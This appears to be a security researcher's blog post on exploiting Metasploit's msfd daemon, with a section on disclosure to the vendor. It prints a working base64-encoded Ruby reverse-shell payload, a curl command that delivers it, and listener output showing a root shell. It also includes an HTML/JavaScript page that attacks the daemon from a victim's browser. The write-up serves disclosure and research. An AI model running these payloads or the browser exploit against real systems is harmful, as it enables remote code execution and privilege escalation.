---
layout: post
title: Hacking the Hacker
---

# Introduction

Metasploit has a couple of ways of providing remote access, one early method was
through `msfd`. Even though msfd was an early and very simple way of providing
remote access and better ways has been created later, msfd has remained in the
framework.

# How msfd work

Msfd works by exposing the msfconsole-interface over a TCP socket. Hopefully,
most people, especially security professionals, would not expose msfconsole on an
external interface. However, even if it's only exposed on localhost, the program
has security issues.

The command below will start the msf-daemon on port 55554. By default, it will
only listen on localhost.

```
# ./msfd -f -q 
[*] Initializing msfd...
[*] Running msfd...
```

A local user on the machine can now connect using `nc` as the command below
shows.

```
$ nc 127.0.0.1 55554
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
msf5> 
```

While the interface aims to mimic msfconsole, it is quite limited and much less
user-friendly. Another difference is how it handles non-metasploit commands.
When running msfconsole, any command typed that is not handled by msfconsole, is
passed through to the shell. When using msfd, commands are not passed through
and therefore we can't run commands directly.

***NB!*** When contacting the metasploit team about this, they claimed that you
were supposed to run commands directly in msfd, but there was a bug in the
implementation. This seems to be wrong since the code in
[plugins/msfd.rb](https://github.com/rapid7/metasploit-framework/blob/master/plugins/msfd.rb)
has `AllowCommandPassthru` set to false. If this is set to true, commands can be
executed in msfd.

A different method was then needed to execute commands, the ruby interpreter
first came to mind. Although msfd seemingly has an error in it's implementation,
when calling `irb`. The ruby-code would simply not execute when called through the
msf-daemon. The workaround for this however, was quite simple. Instead of typing
ruby code after irb has executed, pass the ruby code in the `-e`-paramater, like
this: `irb -e "code"`.


# Get a Shell

We can now get a shell using the method described above, but we need some
shellcode to execute. For this, I turned to `msfvenom`. The problem however, was
that there was no encoder for ruby-code and I therefore received code like this:

```
$ msfvenom -p ruby/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw
No platform was selected, choosing Msf::Module::Platform::Ruby from the payload
No Arch selected, selecting Arch: ruby from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 508 bytes
code = %(cmVxdWlyZSAnc29ja2V0JztjPVRDUFNvY2tldC5uZXcoIjEyNy4wLjAuMSIsIDQ0NDQpOyRzdGRpbi5yZW9wZW4oYyk7JHN0ZG91dC5yZW9wZW4oYyk7JHN0ZGVyci5yZW9wZW4oYyk7JHN0ZGluLmVhY2hfbGluZXt8bHxsPWwuc3RyaXA7bmV4dCBpZiBsLmxlbmd0aD09MDsoSU8ucG9wZW4obCwicmIiKXt8ZmR8IGZkLmVhY2hfbGluZSB7fG98IGMucHV0cyhvLnN0cmlwKSB9fSkgcmVzY3VlIG5pbCB9).unpack(%(m0)).first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen(%(ruby), %(wb)) rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end
```

A newline character will break the exploit and therefore this cannot be used
out-of-the-box.
The workaround for this, is again, quite simple. The first line in the payload
species how base64 encoding can be accomplished. A separate encoder was created
and sent as a [PR to Metasploit](https://github.com/rapid7/metasploit-framework/pull/9900).

With the new encoder in place, we can generate our shellcode.

```
$ msfvenom -p ruby/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -b "\x0a\x22"
No platform was selected, choosing Msf::Module::Platform::Ruby from the payload
No Arch selected, selecting Arch: ruby from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of ruby/base64
ruby/base64 succeeded with size 709 (iteration=0)
ruby/base64 chosen with final size 709
Payload size: 709 bytes
eval(%(Y29kZSA9ICUoY21WeGRXbHlaU0FuYzI5amEyVjBKenRqUFZSRFVGTnZZMnRsZEM1dVpYY29JakV5Tnk0d0xqQXVNU0lzSURRME5EUXBPeVJ6ZEdScGJpNXlaVzl3Wlc0b1l5azdKSE4wWkc5MWRDNXlaVzl3Wlc0b1l5azdKSE4wWkdWeWNpNXlaVzl3Wlc0b1l5azdKSE4wWkdsdUxtVmhZMmhmYkdsdVpYdDhiSHhzUFd3dWMzUnlhWEE3Ym1WNGRDQnBaaUJzTG14bGJtZDBhRDA5TURzb1NVOHVjRzl3Wlc0b2JDd2ljbUlpS1h0OFptUjhJR1prTG1WaFkyaGZiR2x1WlNCN2ZHOThJR011Y0hWMGN5aHZMbk4wY21sd0tTQjlmU2tnY21WelkzVmxJRzVwYkNCOSkudW5wYWNrKCUobTApKS5maXJzdAppZiBSVUJZX1BMQVRGT1JNID1+IC9tc3dpbnxtaW5nd3x3aW4zMi8KaW5wID0gSU8ucG9wZW4oJShydWJ5KSwgJSh3YikpIHJlc2N1ZSBuaWwKaWYgaW5wCmlucC53cml0ZShjb2RlKQppbnAuY2xvc2UKZW5kCmVsc2UKaWYgISBQcm9jZXNzLmZvcmsoKQpldmFsKGNvZGUpIHJlc2N1ZSBuaWwKZW5kCmVuZA==).unpack(%(m0)).first)

```

This shellcode has no newlines and no double quote, so it can be safely placed
inside `ruby -e "SHELLCODE"`. We paste the full code in a netcat-session with
msfd while we have a netcat-listener listening on port 4444. As the output below
shows, we then receive a shell.

```
$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 50162)
id
uid=0(root) gid=0(root) groups=0(root)
```

This can obviusly be used for privilege escalation if the attacker has a
low-privileged user on the machine and the msfd-program is running as root.
Many people use Metasploit through Kali Linux, so running Metasploit-programs as
root is probably quite common even when it's not necessary.

The attack can also work against a remote target if the victim has chosen to
expose the daemon externally with the following parameters:

```
# ./msfd -f -q -a 0.0.0.0
[*] Initializing msfd...
[*] Running msfd...
```

The procedure for this is basically the same as above, so it will not be
discussed further.

# Attacking Through the Browser

Most people would probably not expose their msfconsole-instance publicly, but
they may think that exposing it on localhost is safe. Or at the very least, it
will limit attacks to users who have local access. This however, is not the
case; an attacker can host a web site that targets the msf daemon through the
victim's browser.

JavaScript (JS) running in the browser is quite limited in which network requests it
can send and to which hosts it can send traffic. These limitations are enforced
by the browser and there are really two limitations of importance:

1. Protocol used - For this discussion, we can just assume that HTTP and HTTPS
are the only protocols allowed. HTTPS is useless for us in this discussion, so
the only protocol available is HTTP.
2. Same-Origin-Policy - I am not going into details about how SOP works, but
essentially JS is only allowed to connect to the same host it's originating
from. There are some loopholes to this and JS is allowed to send requests
cross-origin if they are considered "safe" by the browser. Again, I will not go
into detail about which requests are considered safe, but this is crucial for
the exploit since we want to target a different origin. As a side note, it's worth
noting that JS is not allowed to read the response from these requests, but that
is not an issue in this discussion. For more details about this, read about SOP,
Cross-Origin-Resource-Sharing (CORS) and Cross-Site-Request-Forgery (CSRF).

Since we are limited to the HTTP-protocol, we must take advantage of
Inter-Protocol exploitation [1] to deliver our payload. This is relatively easy
with HTTP and msfd since they are both based on terminating sequences with a
newline character. In other words, each line we send in a HTTP-request will be
interpreted as a new command in msfd.

Most lines in a HTTP-request is obviously invalid for msfd and will therefore
fail, but for our exploit to work, we need just one line to valid. Based on some
limited tested, the
start of the line in msfd must be a valid msfconsole command. This places quite
a few limitations on where we can place our payload, since there is only one
place (that I know of) where we can control the start of the line and that is in
the HTTP body.

We must also remember that this HTTP-request should be sent cross-domain and
therefore the request must be considered "safe" by the browser. Luckily for us,
HTTP-POST requests are considered "safe" and we can freely control the HTTP body
when `Content-Type` is set to `text/plain`.

Before we start sending these requests from JS, we test it with curl. We first
create a file with our payload (note the newline at the end which is necessary
to end the command).

```
$ cat data.txt
irb -e
"eval(%(Y29kZSA9ICUoY21WeGRXbHlaU0FuYzI5amEyVjBKenRqUFZSRFVGTnZZMnRsZEM1dVpYY29JakV5Tnk0d0xqQXVNU0lzSURRME5EUXBPeVJ6ZEdScGJpNXlaVzl3Wlc0b1l5azdKSE4wWkc5MWRDNXlaVzl3Wlc0b1l5azdKSE4wWkdWeWNpNXlaVzl3Wlc0b1l5azdKSE4wWkdsdUxtVmhZMmhmYkdsdVpYdDhiSHhzUFd3dWMzUnlhWEE3Ym1WNGRDQnBaaUJzTG14bGJtZDBhRDA5TURzb1NVOHVjRzl3Wlc0b2JDd2ljbUlpS1h0OFptUjhJR1prTG1WaFkyaGZiR2x1WlNCN2ZHOThJR011Y0hWMGN5aHZMbk4wY21sd0tTQjlmU2tnY21WelkzVmxJRzVwYkNCOSkudW5wYWNrKCUobTApKS5maXJzdAppZiBSVUJZX1BMQVRGT1JNID1+IC9tc3dpbnxtaW5nd3x3aW4zMi8KaW5wID0gSU8ucG9wZW4oJShydWJ5KSwgJSh3YikpIHJlc2N1ZSBuaWwKaWYgaW5wCmlucC53cml0ZShjb2RlKQppbnAuY2xvc2UKZW5kCmVsc2UKaWYgISBQcm9jZXNzLmZvcmsoKQpldmFsKGNvZGUpIHJlc2N1ZSBuaWwKZW5kCmVuZA==).unpack(%(m0)).first)"

```

This payload can be sent to msfd with the following curl-command.

```
$ curl -iv http://127.0.0.1:55554/ -X POST --data-binary "@data.txt"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 55554 (#0)
> POST / HTTP/1.1
> Host: 127.0.0.1:55554
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 720
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 720 out of 720 bytes
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
msf5 > [-] Unknown command: POST.
msf5 > [-] Unknown command: Host:.
msf5 > [-] Unknown command: User-Agent:.
msf5 > [-] Unknown command: Accept:.
msf5 > [-] Unknown command: Content-Length:.
msf5 > [-] Unknown command: Content-Type:.
```

Based on this, we can see that most HTTP-headers were invalid commands. If you
started a netcat-listener you will notice that the HTTP-body was executed.

```
$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 50176)
id
uid=0(root) gid=0(root) groups=0(root)
```

Sending this request from curl is obviously not what is interesting, the
interesting part is sending the request from JS.

# Building the exploits

Exploitation was divided into two Metasploit-modules. Both should be fairly
self-explanatory as they are quite simple. For completeness, the JS to perform
the exploit is included below. The Metasploit-module is a slightly modified
version of this.

```
<html>
<head></head>
<body>
<script>
var xml = new XMLHttpRequest();
xml.open("POST","http://127.0.0.1:55554/", true);
var s = String("#{shellcode}");
xml.send("irb -e \"" + s + "\"\n");
</script>
</body>
</html>
```

If the attacker can trick the victim (running msfd) to visit a web site serving
the HTML-code above, the attacker can get a shell on the victim's machine.

All the code for the Metasploit-modules can be seen
[here](https://github.com/rapid7/metasploit-framework/pull/9908).

# Notes on Reliability

The remote exploit (not going through a browser) was reliable on Windows and
Linux. The browser-exploit however, was unreliable on Windows and would almost
never work on Chrome or Firefox. It did however work on IE under some
circumstances.

# Vendor Disclosure

When I first noticed this, I treated this as a vulnerability and notified
Metasploit about the issue in private. After about a week and a half, they
concluded that this was not a vulnerability, but they welcomed me to send a pull
request to get the modules added in the Metasploit repository.

# References

- [1] [Inter-Protocol Exploitation](https://en.wikipedia.org/wiki/Inter-protocol_exploitation)


